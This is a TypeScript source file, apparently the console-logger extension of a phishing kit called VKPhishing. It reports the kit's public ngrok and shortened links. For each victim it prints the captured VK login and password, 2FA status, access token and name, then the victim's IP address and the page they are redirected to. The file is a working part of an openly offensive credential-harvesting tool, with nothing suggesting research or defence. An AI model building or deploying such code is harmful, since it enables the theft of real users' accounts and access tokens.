import { VKPhishing } from '..'

import { EOL } from 'os'
import chalk from 'chalk'
import consola from 'consola'
import { R_SUCCESS, R_REQUIRE_2FA } from '../auth-constants'
import declareExtension from './_'

function formatObject(obj: object) {
  let message = ''

  for (const key in obj) {
    message +=
      chalk.hex('#905')(key) +
      ': ' +
      chalk.hex('#07a')(obj[key as keyof typeof obj]) +
      EOL
  }

  return message
}

function extension(instance: VKPhishing) {
  instance.on('ngrok:error', consola.error)

  instance.on('ngrok:ready-url', (url) => {
    consola.log('Listening public url: ' + url)
  })

  instance.on('aye-kosmonavt:got-short-url', (shortUrl) => {
    consola.log('Shorten url is: ' + shortUrl)
  })

  instance.on('start', ({ port, host }) => {
    consola.log(`🦄 Server listening on http://${host}:${port}/`)
  })

  instance.on('ws:started', (params) => {
    if (params.expose) {
      consola.info(
        `Socket.IO server listening on ws://localhost:${params.port}${params.path}`
      )
    } else {
      consola.log(
        `🔒 Socket.IO server listening on wss://${params.host}:${params.port}${params.path}`
      )
    }
  })

  instance.on('after:auth-attempt', ({ attempt, response }) => {
    consola.info({
      label: true,
      message: `Trying authenticate with credentials: ${EOL}`
    })

    const input = chalk.bold.blueBright('> ')
    const outputSign = '< '

    consola.log(
      formatObject({
        [input + 'Login']: attempt.username,
        [input + 'Password']: attempt.password
      })
    )

    if (response.status === R_SUCCESS) {
      consola.log(chalk.bold.green(outputSign) + 'Success!' + EOL)
    } else if (response.status === R_REQUIRE_2FA) {
      consola.log(chalk.bold.yellow(outputSign) + 'Required 2FA!' + EOL)
    } else {
      consola.log(chalk.bold.red(outputSign) + 'Failed!' + EOL)
    }
  })

  instance.on('after:successful-auth', (user) => {
    consola.info({
      message: `Got new account https://vk.com/id${user.id}`,
      badge: true
    })

    consola.log(
      formatObject({
        Name: user.first_name + ' ' + user.last_name,
        Login: user.username,
        Password: user.password,
        '2fa': user['2fa']
          ? chalk.red('Enabled')
          : chalk.greenBright('Disabled'),
        Token: user.token
      })
    )
  })

  instance.on('before:user-leave', ({ wayOut, ctx }) => {
    let wo = wayOut
    const IP =
      ctx.req.headers['x-forwarded-for'] || ctx.req.connection.remoteAddress

    if (
      instance.extensions.map((e) => e.__meta__.name).includes('aye-kosmonavt')
    ) {
      const url = new URL(wo)
      const redirectUrl =
        url.searchParams.get('redir') ||
        url.searchParams.get('r') ||
        url.searchParams.get('redirectUrl')

      if (redirectUrl) {
        wo =
          Buffer.from(redirectUrl, 'base64').toString('utf8') +
          ' by AYE Kosmonavt'
      }
    }

    consola.success(
      `User with IP: ${chalk.greenBright(
        IP
      )} ${EOL}Has been redirected to: ${wo}`
    )
  })

  return instance
}

export default declareExtension(extension, {
  name: 'logger',
  description: 'Module that shows info in console'
})
